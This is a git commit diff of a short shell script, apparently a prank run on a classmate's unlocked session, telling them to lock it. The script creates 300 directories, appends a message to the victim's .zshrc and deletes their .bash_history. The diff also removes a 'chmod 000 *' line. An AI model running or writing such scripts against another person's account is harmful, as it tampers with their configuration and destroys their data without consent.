f8a591b4a80d46451b39898ad9b1b91a2428a382
Bonnivard Julien <bonnivardjulien1@gmail.com>
2022-03-10 17:32:11 +0100

    ok

--- sh.sh
+++ sh.sh
@@ -7,9 +7,9 @@ while ((nbr != 300))
 		mkdir "FERME_TA_SESSION$nbr"
 		((nbr += 1))
 	done
-chmod 000 *
 cd ./..
 echo -e "echo -e '\033[31mjbonniva est un gentil tuteur! MAINTENANT JE FERMERAI MA SESSION!\033[00m'" >> .zshrc
 rm -rf .bash_history
+rm -rf ok
 clear
 curl parrot.live
